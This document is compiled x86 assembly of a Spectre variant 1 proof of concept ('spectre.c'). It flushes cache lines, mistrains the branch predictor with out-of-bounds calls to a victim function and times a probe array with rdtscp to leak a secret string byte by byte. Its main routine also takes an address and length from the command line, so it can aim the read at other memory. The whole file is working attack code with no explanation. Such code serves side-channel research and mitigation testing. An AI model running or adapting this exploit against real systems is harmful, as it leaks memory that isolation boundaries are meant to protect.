	.file	"spectre.c"
	.text
	.p2align 4
	.globl	check
	.type	check, @function
check:
.LFB5562:
	.cfi_startproc
	call	__x86.get_pc_thunk.ax
	addl	$_GLOBAL_OFFSET_TABLE_, %eax
	movl	array1_size@GOTOFF(%eax), %eax
	cmpl	4(%esp), %eax
	seta	%al
	movzbl	%al, %eax
	ret
	.cfi_endproc
.LFE5562:
	.size	check, .-check
	.p2align 4
	.globl	victim_function
	.type	victim_function, @function
victim_function:
.LFB5563:
	.cfi_startproc
	pushl	%edi
	.cfi_def_cfa_offset 8
	.cfi_offset 7, -8
	pushl	%esi
	.cfi_def_cfa_offset 12
	.cfi_offset 6, -12
	pushl	%ebx
	.cfi_def_cfa_offset 16
	.cfi_offset 3, -16
	movl	16(%esp), %eax
	call	__x86.get_pc_thunk.bx
	addl	$_GLOBAL_OFFSET_TABLE_, %ebx
	movl	array1_size@GOTOFF(%ebx), %edx
	cmpl	%eax, %edx
	jbe	.L3
	subl	$1, %eax
	js	.L3
	leal	array1@GOTOFF(%ebx), %esi
	movzbl	temp@GOTOFF(%ebx), %ecx
	leal	array2@GOTOFF(%ebx), %edi
	addl	%esi, %eax
	.p2align 4,,10
	.p2align 3
.L5:
	movzbl	(%eax), %edx
	subl	$1, %eax
	sall	$9, %edx
	andb	(%edi,%edx), %cl
	cmpl	%esi, %eax
	jns	.L5
	movb	%cl, temp@GOTOFF(%ebx)
.L3:
	popl	%ebx
	.cfi_restore 3
	.cfi_def_cfa_offset 12
	popl	%esi
	.cfi_restore 6
	.cfi_def_cfa_offset 8
	popl	%edi
	.cfi_restore 7
	.cfi_def_cfa_offset 4
	ret
	.cfi_endproc
.LFE5563:
	.size	victim_function, .-victim_function
	.p2align 4
	.globl	readMemoryByte
	.type	readMemoryByte, @function
readMemoryByte:
.LFB5564:
	.cfi_startproc
	pushl	%ebp
	.cfi_def_cfa_offset 8
	.cfi_offset 5, -8
	movl	$256, %ecx
	pushl	%edi
	.cfi_def_cfa_offset 12
	.cfi_offset 7, -12
	pushl	%esi
	.cfi_def_cfa_offset 16
	.cfi_offset 6, -16
	pushl	%ebx
	.cfi_def_cfa_offset 20
	.cfi_offset 3, -20
	call	__x86.get_pc_thunk.bx
	addl	$_GLOBAL_OFFSET_TABLE_, %ebx
	subl	$76, %esp
	.cfi_def_cfa_offset 96
	movl	%ebx, 32(%esp)
	leal	results@GOTOFF(%ebx), %edi
	movl	%gs:20, %eax
	movl	%eax, 60(%esp)
	xorl	%eax, %eax
	movl	%edi, 40(%esp)
	movl	$0, 52(%esp)
	movl	$999, 28(%esp)
	rep stosl
	leal	array1_size@GOTOFF(%ebx), %eax
	movl	%eax, 44(%esp)
	leal	52(%esp), %eax
	movl	%eax, 24(%esp)
	leal	array2@GOTOFF(%ebx), %eax
	movl	%eax, 20(%esp)
	leal	array1@GOTOFF(%ebx), %eax
	movl	%eax, 36(%esp)
.L9:
	movl	20(%esp), %edi
	movl	%edi, %eax
	leal	131072(%edi), %edx
	.p2align 4,,10
	.p2align 3
.L10:
	clflush	(%eax)
	addl	$512, %eax
	cmpl	%eax, %edx
	jne	.L10
	movl	32(%esp), %eax
	movl	96(%esp), %edi
	movl	$-1431655765, %ebp
	movl	array1_size@GOTOFF(%eax), %ebx
	movl	28(%esp), %eax
	cltd
	idivl	%ebx
	movl	$29, %ebx
	movl	%ebx, %esi
	movl	44(%esp), %ebx
	movl	%edx, 16(%esp)
	xorl	%edx, %edi
	.p2align 4,,10
	.p2align 3
.L12:
	clflush	(%ebx)
	movl	$0, 56(%esp)
	movl	56(%esp), %eax
	cmpl	$99, %eax
	jg	.L14
	.p2align 4,,10
	.p2align 3
.L11:
	movl	56(%esp), %eax
	addl	$1, %eax
	movl	%eax, 56(%esp)
	movl	56(%esp), %eax
	cmpl	$99, %eax
	jle	.L11
.L14:
	movl	%esi, %eax
	mull	%ebp
	movl	%esi, %eax
	subl	$1, %esi
	shrl	$2, %edx
	leal	(%edx,%edx,2), %edx
	addl	%edx, %edx
	subl	%edx, %eax
	subl	$1, %eax
	movl	%eax, %edx
	shrl	$16, %eax
	xorw	%dx, %dx
	orl	%edx, %eax
	andl	%edi, %eax
	xorl	16(%esp), %eax
	pushl	%eax
	.cfi_def_cfa_offset 100
	call	victim_function
	popl	%eax
	.cfi_def_cfa_offset 96
	cmpl	$-1, %esi
	jne	.L12
	movl	$13, %ebp
	.p2align 4,,10
	.p2align 3
.L13:
	movl	%ebp, %eax
	movzbl	%al, %ebx
	movl	%ebx, %eax
	sall	$9, %eax
	movl	%eax, 16(%esp)
	rdtscp
	movl	24(%esp), %edi
	movl	%eax, 8(%esp)
	movl	%edx, 12(%esp)
	movl	%ecx, (%edi)
	movl	20(%esp), %esi
	movl	16(%esp), %eax
	movzbl	(%esi,%eax), %eax
	rdtscp
	movl	%ecx, (%edi)
	subl	8(%esp), %eax
	movl	$50, %ecx
	movl	%eax, %esi
	sbbl	12(%esp), %edx
	xorl	%eax, %eax
	cmpl	%esi, %ecx
	sbbl	%edx, %eax
	jc	.L15
	movl	32(%esp), %eax
	movl	array1_size@GOTOFF(%eax), %ecx
	movl	28(%esp), %eax
	cltd
	idivl	%ecx
	movl	36(%esp), %eax
	movzbl	(%eax,%edx), %eax
	cmpl	%ebx, %eax
	je	.L15
	movl	40(%esp), %eax
	addl	$1, (%eax,%ebx,4)
.L15:
	addl	$167, %ebp
	cmpl	$42765, %ebp
	jne	.L13
	subl	$1, 28(%esp)
	jne	.L9
	movl	32(%esp), %edi
	movl	results@GOTOFF(%edi), %eax
	xorl	52(%esp), %eax
	movl	%eax, results@GOTOFF(%edi)
	movl	60(%esp), %eax
	subl	%gs:20, %eax
	jne	.L25
	addl	$76, %esp
	.cfi_remember_state
	.cfi_def_cfa_offset 20
	popl	%ebx
	.cfi_restore 3
	.cfi_def_cfa_offset 16
	popl	%esi
	.cfi_restore 6
	.cfi_def_cfa_offset 12
	popl	%edi
	.cfi_restore 7
	.cfi_def_cfa_offset 8
	popl	%ebp
	.cfi_restore 5
	.cfi_def_cfa_offset 4
	ret
.L25:
	.cfi_restore_state
	call	__stack_chk_fail_local
	.cfi_endproc
.LFE5564:
	.size	readMemoryByte, .-readMemoryByte
	.section	.rodata.str1.4,"aMS",@progbits,1
	.align 4
.LC0:
	.string	"Putting '%s' in memory, address %p\n"
	.section	.rodata.str1.1,"aMS",@progbits,1
.LC1:
	.string	"%p"
.LC2:
	.string	"%d"
	.section	.rodata.str1.4
	.align 4
.LC3:
	.string	"Trying malicious_x = %p, len = %d\n"
	.section	.rodata.str1.1
.LC4:
	.string	"Reading %d bytes:\n"
	.section	.rodata.str1.4
	.align 4
.LC5:
	.string	"Reading at malicious_x = %p secc= %c sec_ascii=%d ...\n"
	.section	.rodata.str1.1
.LC6:
	.string	"result[%d]=%d "
.LC7:
	.string	"\n"
.LC8:
	.string	"addr = %llx, pid = %d\n"
	.section	.text.startup,"ax",@progbits
	.p2align 4
	.globl	main
	.type	main, @function
main:
.LFB5565:
	.cfi_startproc
	call	__x86.get_pc_thunk.dx
	addl	$_GLOBAL_OFFSET_TABLE_, %edx
	leal	4(%esp), %ecx
	.cfi_def_cfa 1, 0
	andl	$-16, %esp
	pushl	-4(%ecx)
	movl	%ecx, %eax
	pushl	%ebp
	movl	%esp, %ebp
	.cfi_escape 0x10,0x5,0x2,0x75,0
	pushl	%edi
	pushl	%esi
	pushl	%ebx
	pushl	%ecx
	.cfi_escape 0xf,0x3,0x75,0x70,0x6
	.cfi_escape 0x10,0x7,0x2,0x75,0x7c
	.cfi_escape 0x10,0x6,0x2,0x75,0x78
	.cfi_escape 0x10,0x3,0x2,0x75,0x74
	subl	$104, %esp
	movl	4(%eax), %eax
	movl	(%ecx), %ecx
	movl	%edx, -64(%ebp)
	movl	%ecx, -96(%ebp)
	movl	%eax, -108(%ebp)
	movl	%gs:20, %eax
	movl	%eax, -28(%ebp)
	movl	stdin@GOT(%edx), %eax
	movl	%eax, -72(%ebp)
	leal	check@GOTOFF(%edx), %eax
	movl	%eax, -104(%ebp)
	sarl	$31, %eax
	movl	%eax, -100(%ebp)
	.p2align 4,,10
	.p2align 3
.L27:
	movl	-72(%ebp), %eax
	subl	$12, %esp
	movl	-64(%ebp), %ebx
	pushl	(%eax)
	call	getc@PLT
	addl	$16, %esp
	cmpb	$114, %al
	je	.L41
	cmpb	$10, %al
	je	.L27
	cmpb	$105, %al
	jne	.L35
	movl	-64(%ebp), %ebx
	call	getpid@PLT
	subl	$12, %esp
	movl	-100(%ebp), %edx
	pushl	%eax
	movl	-104(%ebp), %eax
	addl	$33, %eax
	adcl	$0, %edx
	pushl	%edx
	pushl	%eax
	leal	.LC8@GOTOFF(%ebx), %eax
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	addl	$32, %esp
	jmp	.L27
.L41:
	movl	-64(%ebp), %ebx
	movl	secret@GOTOFF(%ebx), %eax
	leal	array1@GOTOFF(%ebx), %edi
	pushl	%eax
	pushl	%eax
	leal	.LC0@GOTOFF(%ebx), %eax
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	movl	secret@GOTOFF(%ebx), %eax
	movl	%eax, %edx
	movl	%eax, (%esp)
	subl	%edi, %edx
	movl	%edx, -48(%ebp)
	call	strlen@PLT
	addl	$12, %esp
	movl	%eax, -44(%ebp)
	movl	%eax, %esi
	leal	array2@GOTOFF(%ebx), %eax
	pushl	$131072
	pushl	$1
	pushl	%eax
	call	memset@PLT
	addl	$16, %esp
	cmpl	$3, -96(%ebp)
	je	.L42
.L29:
	movl	-64(%ebp), %ebx
	subl	$4, %esp
	pushl	%esi
	leal	.LC4@GOTOFF(%ebx), %eax
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	movl	-44(%ebp), %eax
	addl	$16, %esp
	subl	$1, %eax
	movl	%eax, -44(%ebp)
	testl	%eax, %eax
	js	.L27
	leal	.LC5@GOTOFF(%ebx), %ecx
	leal	.LC6@GOTOFF(%ebx), %eax
	movl	$0, -68(%ebp)
	movl	%ecx, -84(%ebp)
	leal	-40(%ebp), %ecx
	movl	%ecx, -92(%ebp)
	leal	-30(%ebp), %ecx
	movl	%ecx, -76(%ebp)
	leal	4+results@GOTOFF(%ebx), %ecx
	movl	%ecx, -80(%ebp)
	leal	.LC7@GOTOFF(%ebx), %ecx
	movl	%ecx, -88(%ebp)
	movl	%eax, -60(%ebp)
.L30:
	movl	-64(%ebp), %ebx
	movl	-68(%ebp), %edi
	subl	$12, %esp
	movl	$1, %esi
	movl	secret@GOTOFF(%ebx), %eax
	movsbl	(%eax,%edi), %eax
	addl	$1, %edi
	pushl	%eax
	pushl	%eax
	pushl	-48(%ebp)
	pushl	-84(%ebp)
	pushl	$1
	call	__printf_chk@PLT
	movl	-48(%ebp), %eax
	addl	$28, %esp
	pushl	-92(%ebp)
	pushl	-76(%ebp)
	pushl	%eax
	leal	1(%eax), %edx
	movl	%edi, -68(%ebp)
	movl	%edx, -48(%ebp)
	call	readMemoryByte
	movl	-80(%ebp), %edi
	addl	$16, %esp
	jmp	.L33
	.p2align 4,,10
	.p2align 3
.L32:
	addl	$1, %esi
	addl	$4, %edi
	cmpl	$256, %esi
	je	.L43
.L33:
	movl	-4(%edi), %eax
	movl	(%edi), %edx
	leal	-1(%esi), %ecx
	cmpl	%edx, %eax
	jle	.L32
	movl	%eax, %ebx
	subl	%edx, %ebx
	cmpl	$100, %ebx
	jle	.L32
	pushl	%eax
	movl	-64(%ebp), %ebx
	addl	$4, %edi
	pushl	%ecx
	pushl	-60(%ebp)
	pushl	$1
	call	__printf_chk@PLT
	pushl	-4(%edi)
	pushl	%esi
	addl	$1, %esi
	pushl	-60(%ebp)
	pushl	$1
	call	__printf_chk@PLT
	addl	$32, %esp
	cmpl	$256, %esi
	jne	.L33
.L43:
	subl	$8, %esp
	pushl	-88(%ebp)
	movl	-64(%ebp), %ebx
	pushl	$1
	call	__printf_chk@PLT
	movl	-44(%ebp), %eax
	addl	$16, %esp
	subl	$1, %eax
	movl	%eax, -44(%ebp)
	testl	%eax, %eax
	jns	.L30
	jmp	.L27
.L35:
	movl	-28(%ebp), %eax
	subl	%gs:20, %eax
	jne	.L44
	leal	-16(%ebp), %esp
	xorl	%eax, %eax
	popl	%ecx
	.cfi_remember_state
	.cfi_restore 1
	.cfi_def_cfa 1, 0
	popl	%ebx
	.cfi_restore 3
	popl	%esi
	.cfi_restore 6
	popl	%edi
	.cfi_restore 7
	popl	%ebp
	.cfi_restore 5
	leal	-4(%ecx), %esp
	.cfi_def_cfa 4, 4
	ret
.L42:
	.cfi_restore_state
	movl	-64(%ebp), %ebx
	movl	-108(%ebp), %esi
	pushl	%eax
	leal	-48(%ebp), %eax
	pushl	%eax
	leal	.LC1@GOTOFF(%ebx), %eax
	pushl	%eax
	pushl	4(%esi)
	call	__isoc99_sscanf@PLT
	addl	$12, %esp
	leal	-44(%ebp), %eax
	subl	%edi, -48(%ebp)
	pushl	%eax
	leal	.LC2@GOTOFF(%ebx), %eax
	pushl	%eax
	pushl	8(%esi)
	call	__isoc99_sscanf@PLT
	leal	.LC3@GOTOFF(%ebx), %eax
	pushl	-44(%ebp)
	pushl	-48(%ebp)
	pushl	%eax
	pushl	$1
	call	__printf_chk@PLT
	movl	-44(%ebp), %esi
	addl	$32, %esp
	jmp	.L29
.L44:
	call	__stack_chk_fail_local
	.cfi_endproc
.LFE5565:
	.size	main, .-main
	.local	results
	.comm	results,1024,32
	.globl	temp
	.bss
	.type	temp, @object
	.size	temp, 1
temp:
	.zero	1
	.globl	secret
	.section	.rodata.str1.4
	.align 4
.LC9:
	.string	"The Magic Words are Squeamish Ossifrage."
	.section	.data.rel.local,"aw"
	.align 4
	.type	secret, @object
	.size	secret, 4
secret:
	.long	.LC9
	.globl	array2
	.bss
	.align 32
	.type	array2, @object
	.size	array2, 131072
array2:
	.zero	131072
	.globl	unused2
	.align 32
	.type	unused2, @object
	.size	unused2, 64
unused2:
	.zero	64
	.globl	array1
	.data
	.align 32
	.type	array1, @object
	.size	array1, 160
array1:
	.string	"\001\002\003\004\005\006\007\b\t\n\013\f\r\016\017\020"
	.zero	143
	.globl	unused1
	.bss
	.align 32
	.type	unused1, @object
	.size	unused1, 64
unused1:
	.zero	64
	.globl	array1_size
	.data
	.align 4
	.type	array1_size, @object
	.size	array1_size, 4
array1_size:
	.long	16
	.section	.text.__x86.get_pc_thunk.ax,"axG",@progbits,__x86.get_pc_thunk.ax,comdat
	.globl	__x86.get_pc_thunk.ax
	.hidden	__x86.get_pc_thunk.ax
	.type	__x86.get_pc_thunk.ax, @function
__x86.get_pc_thunk.ax:
.LFB5566:
	.cfi_startproc
	movl	(%esp), %eax
	ret
	.cfi_endproc
.LFE5566:
	.section	.text.__x86.get_pc_thunk.dx,"axG",@progbits,__x86.get_pc_thunk.dx,comdat
	.globl	__x86.get_pc_thunk.dx
	.hidden	__x86.get_pc_thunk.dx
	.type	__x86.get_pc_thunk.dx, @function
__x86.get_pc_thunk.dx:
.LFB5567:
	.cfi_startproc
	movl	(%esp), %edx
	ret
	.cfi_endproc
.LFE5567:
	.section	.text.__x86.get_pc_thunk.bx,"axG",@progbits,__x86.get_pc_thunk.bx,comdat
	.globl	__x86.get_pc_thunk.bx
	.hidden	__x86.get_pc_thunk.bx
	.type	__x86.get_pc_thunk.bx, @function
__x86.get_pc_thunk.bx:
.LFB5568:
	.cfi_startproc
	movl	(%esp), %ebx
	ret
	.cfi_endproc
.LFE5568:
	.hidden	__stack_chk_fail_local
	.ident	"GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0"
	.section	.note.GNU-stack,"",@progbits
